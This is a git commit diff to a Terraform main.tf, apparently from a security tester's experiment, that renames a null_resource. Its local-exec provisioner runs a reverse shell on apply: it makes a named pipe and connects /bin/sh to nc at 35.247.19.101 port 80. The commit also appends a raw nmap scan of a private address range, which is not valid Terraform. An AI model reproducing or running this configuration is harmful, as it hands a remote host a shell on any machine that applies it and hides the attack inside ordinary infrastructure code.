ca3f53613c9b57e380349cb31a1a724d4c5a8774
benny <benny.himley@nccgroup.trust>
2019-07-12 15:24:48 -0700

    try without -e 2

--- main.tf
+++ main.tf
@@ -7,7 +7,7 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
-resource "null_resource" "example7" {
+resource "null_resource" "example8" {
   provisioner "local-exec" {
     command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 80 1>/tmp/backpipe"
   }
@@ -17,3 +17,8 @@ resource "null_resource" "example7" {
 output "random" {
   value = "${random_id.random.hex}"
 }
+
+
+
+
+nmap -Pn -sV -vv -p22 192.168.122.2-192.168.255.254 -oA output_limitedtcp-%D 
